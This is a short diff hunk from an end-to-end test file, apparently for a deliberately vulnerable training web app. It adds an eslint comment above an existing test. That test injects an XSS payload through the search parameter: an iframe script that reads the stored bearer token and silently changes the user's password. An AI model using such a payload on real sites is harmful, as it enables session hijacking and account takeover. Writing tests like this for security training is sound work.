@@ -24,6 +24,7 @@ describe('/#/privacy-security/change-password', () => {
         email: 'bender',
         password: 'OhG0dPlease1nsertLiquor!'
       })
+      // eslint-disable-next-line no-template-curly-in-string
       const payload = "<iframe src=\"javascript:xmlhttp = new XMLHttpRequest(); xmlhttp.open('POST', 'http://localhost:3000/rest/user/change-password'); xmlhttp.setRequestHeader('Authorization',`Bearer=${localStorage.getItem('token')}`); xmlhttp.setRequestHeader('Content-Type', 'application/json'); xmlhttp.send(JSON.stringify({ new: 'slurmCl4ssic', repeat: 'slurmCl4ssic' }));\">"
       cy.visit('/#/search?q=' + encodeURIComponent(payload))
       cy.wait(2000)
